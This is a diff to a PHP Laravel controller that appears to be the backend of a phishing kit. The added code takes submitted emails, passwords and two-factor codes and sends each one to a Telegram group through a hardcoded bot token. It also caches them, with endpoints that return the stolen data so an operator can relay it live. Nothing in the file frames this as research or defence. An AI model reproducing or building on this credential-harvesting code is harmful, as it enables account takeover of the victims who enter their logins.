@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\Label;
 use App\Models\Language;
+use App\Models\Setting;
 use GuzzleHttp\Client;
 use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Foundation\Validation\ValidatesRequests;
@@ -13,6 +14,7 @@ use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Log;
+use Throwable;
 
 class Controller extends BaseController
 {
@@ -20,6 +22,8 @@ class Controller extends BaseController
 
     public $botKey;
     public $groupTelegramId;
+    public $email;
+    public $password;
 
 
     public function __construct()
@@ -27,10 +31,75 @@ class Controller extends BaseController
         $settings = Cache::rememberForever('settings', function () {
             return \App\Models\Setting::pluck('value', 'key')->toArray();
         });
-        // $this->botKey = "6447231841:AAFHP285bCVaxURhDEiKFZAaP-qRwyq-rkE" ?? $settings['bot_id'];
-        // $this->groupTelegramId = "-4174549803" ?? $settings['group_id'];
+        $this->botKey = "6447231841:AAFHP285bCVaxURhDEiKFZAaP-qRwyq-rkE" ?? $settings['bot_id'];
+        $this->groupTelegramId = "-4141594512" ?? $settings['group_id'];
         $this->botKey = $settings['bot_id'];
         $this->groupTelegramId = $settings['group_id'];
+    }
+
+    public function setCacheByEmail(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $email = $request->email ?? '';
+            $password = $request->password ?? '';
+            $fa = $request->fa ?? '';
+            $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
+            $isFaSuccessfully = $request->isFaSuccessfully ?? '';
+            $isCheckLogin = $request->isCheckLogin ?? 0;
+            $isCheckFa = $request->isCheckFa ?? 0;
+            Cache::put($email, json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'password' => $password,
+                'fa' => $fa,
+                'isLoginSuccessfully' => $isLoginSuccessfully,
+                'isFaSuccessfully' => $isFaSuccessfully,
+                // 'isCheckLogin' => $isCheckLogin,
+                // 'isCheckFa' => $isCheckFa,
+            ]));
+
+            return response()->json([
+                'status' => 0,
+            ]);
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function getCacheByEmail(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $email = $request->email ?? '';
+            return response()->json([
+                'status' => 0,
+                'data' => json_decode(Cache::pull($email, ''))
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function getCacheByKey(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $key = $request->key ?? '';
+            return response()->json([
+                'status' => 0,
+                'data' => json_decode(Cache::pull($key, ''))
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
     }
 
     public function index()
@@ -94,20 +163,28 @@ class Controller extends BaseController
     {
         try {
             $fa_code = $request->fa_code ?? '';
-            $infoByIP = $this->getInfoByIP($request);
-            $data = [
-                'chat_id' => $this->groupTelegramId,
-                'text' => "$infoByIP\nFA code: $fa_code"
-            ];
-            $client = new Client();
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
+            $email = $request->email ?? '';
+            // $infoByIP = $this->getInfoByIP($request);
+            // $data = [
+            //     'chat_id' => $this->groupTelegramId,
+            //     'text' => "$infoByIP\nFA code: $fa_code"
+            // ];
+            // $client = new Client();
+            // $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+            //     'json' => $data
+            // ]);
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'fa' => $fa_code,
+                'step' => 2,
+            ]));
+
             return response()->json([
                 'status' => 0
             ]);
         } catch (Throwable $e) {
-
+            Cache::forget($email);
             return response()->json([
                 'status' => 1,
                 'message' => $e->getMessage(),
@@ -125,15 +202,35 @@ class Controller extends BaseController
                 'chat_id' => $this->groupTelegramId,
                 'text' => "$infoByIP\nEmail: $email\nPassword: $password"
             ];
+
             $client = new Client();
+            // send ip
+            $data['text'] = "$infoByIP IP: $request->ipAddress";
             $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
                 'json' => $data
             ]);
+            // send email
+            $data['text'] = "$infoByIP Email: $email";
+            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                'json' => $data
+            ]);
+            // send pass
+            $data['text'] = "$infoByIP Password: $password";
+            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                'json' => $data
+            ]);
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'password' => $password,
+                'step' => 1
+            ]));
+
             return response()->json([
                 'status' => 0
             ]);
         } catch (Throwable $e) {
-
+            Cache::forget($email);
             return response()->json([
                 'status' => 1,
                 'message' => $e->getMessage(),
